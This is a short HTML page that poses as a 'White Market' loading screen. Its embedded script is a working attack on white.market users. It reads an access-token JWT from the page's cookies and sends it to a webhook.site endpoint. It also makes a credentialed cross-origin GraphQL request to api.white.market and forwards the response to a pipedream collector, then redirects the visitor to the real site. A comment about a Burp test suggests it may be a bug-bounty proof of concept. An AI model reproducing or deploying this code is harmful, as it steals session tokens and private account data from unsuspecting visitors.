<!DOCTYPE html>
<html>
<head><title>White Market</title></head>
<body>
<h1>Loading...</h1>
<script>
// Method 1: Try direct cookie theft
const localCookies = document.cookie;
if (localCookies.includes('access-token')) {
    const jwt = localCookies.split(';').find(c => c.includes('access-token')).split('=')[1];
    fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({method: 'direct_cookie', jwt: jwt})
    });
}

// Method 2: CORS attack - use the working query from your Burp test
fetch('https://api.white.market/graphql/api', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'x-accept-language': 'en_US'
    },
    body: JSON.stringify({
        query: 'query UrgentAndUnreadNotifications { unread: notification_list_paginated(search: { isRead: false }) { totalCount } }',
        operationName: 'UrgentAndUnreadNotifications'
    })
})
.then(r => r.json())
.then(d => {
    fetch('https://eo5dlnbgif530n8.m.pipedream.net', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({method: 'cors_notifications', data: d})
    });
});

setTimeout(() => window.location.href = 'https://white.market', 3000);
</script>
</body>
</html>
